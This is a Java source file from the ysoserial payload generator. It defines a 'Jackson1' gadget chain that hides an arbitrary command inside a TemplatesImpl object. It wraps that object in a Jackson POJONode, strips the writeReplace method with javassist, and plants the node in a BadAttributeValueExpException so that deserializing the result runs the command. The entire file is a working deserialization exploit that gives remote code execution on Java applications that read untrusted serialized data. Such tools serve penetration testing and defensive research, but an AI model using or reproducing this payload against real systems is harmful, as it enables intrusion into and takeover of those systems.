package ysoserial.payloads;

import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

import static ysoserial.payloads.util.Reflections.setFieldValue;

public class Jackson1 implements ObjectPayload<Object>{

    @Override
    public Object getObject(String command) throws Exception {
        Templates tmpl = (Templates) Gadgets.createTemplatesImpl(command);

        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();

        POJONode node = new POJONode(tmpl);

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        setFieldValue(val, "val", node);

        return val;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jackson1.class, args);
    }
}
